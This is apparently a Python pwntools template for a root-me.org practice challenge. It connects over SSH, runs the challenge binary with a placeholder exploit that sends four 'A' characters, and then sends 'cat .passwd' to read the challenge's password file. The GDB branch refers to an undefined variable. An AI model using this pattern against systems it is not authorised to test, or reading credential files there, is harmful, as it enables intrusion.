#!/usr/bin/env python2
from pwn import *

##########################################################################
# Change these values to match the root-me.org challange
HOST    = 'challenge02.root-me.org'
USER    = 'app-systeme-ch13'
PASS    = USER
PORT    = 2222
FNAME   = './ch13'
DL_LIST = [FNAME, './ch13.c']
##########################################################################

##########################################################################
# Runtime options (TODO: change these to arguments)
DOWNLOAD    = False
REMOTE      = False
GDB         = False
INTERACTIVE = False
##########################################################################

##########################################################################
# Implement your exploit code here
##########################################################################
def runexploit(p):
    p.sendline('A'*4)


def downloadfiles():
    s = gets()
    for dlfname in DL_LIST:
    	bin_file = s.download_data(dlfname)
    	f = open(dlfname, 'wb')
    	f.write(bin_file)
    	f.close()

def gets():
    s = ssh(host=HOST, user=USER, password=PASS, port=PORT)
    return s

def getp(s=None):
    if REMOTE:
        if s == None:
            s = gets()
        p = s.process([FNAME])
    elif GDB:
        p = process(['gdbserver', 'localhost:4200', LOCAL_FNAME])
    else:
        p = process([FNAME])
    return p

def main():
    if DOWNLOAD:
        downloadfiles()
        sys.exit(0)

    p = getp()
    runexploit(p)

    if INTERACTIVE:
        p.interactive()
    else:
        p.recvuntil('$ ')
        p.sendline('cat .passwd')
        p.sendline('exit')
        print(p.recvline())

    p.close()


if __name__ == "__main__":
    main()
